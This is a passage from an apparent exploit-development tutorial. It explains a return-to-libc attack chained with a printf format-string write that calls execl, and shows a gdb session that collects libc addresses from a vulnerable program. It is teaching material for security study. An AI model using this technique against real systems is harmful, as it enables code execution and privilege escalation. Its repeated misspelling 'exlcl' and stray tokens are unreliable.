format token (0x0000) into the third direct parameter. Because the third parameter contains its own location, the value of 0x00000 will be written into that spot. Next, the exlcl() function is called with the arguments from the first ./wrapper string onward. Voilà, we have created the desired exlcl() function on the fly with this self-modifying buffer attack string.

In order to build the preceding exploit, we need the following information:

+   - The address of the printf() function
+   - The address of the exlcl() function
+   - The address of the %6\$n string in memory (we will use the environment section)
+   - The address of the ./wrapper string in memory (we will use the environment section)
+   - The address of the location we want to overwrite with a NULL value

Starting at the top, let's get the addresses:

```
$ $ gdb -q vuln2
Reading symbols from vuln2...done.
(gdb) b main
Breakpoint 1 at 0x5b1: file vuln2.c, line 5.
(gdb) r
Starting program: /root/ch12/vuln2

Breakpoint 1, main (argc=1, argv=0xbffff764) at vuln2.c:5
5           strcpy(buffer, argv[1]);
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7e46930 <__printf>
(gdb) p exlcl
$2 = {<text variable, no debug info>} 0xb7eae750 <__GI_execl>
(gdb) q
A debugging session is active.

Inferior 1 [process 14355] will be killed.

Quit anyway? (y or n) y
```

We will use the environment section of memory to store our strings and retrieve their location with our handy getenv utility. Remember that the getenv program needs to be the same size as the vulnerable program—in this case, vuln2 (five characters):

```
$ cp getenv gtenv
```

Okay, we are ready to place the strings into memory and retrieve their locations: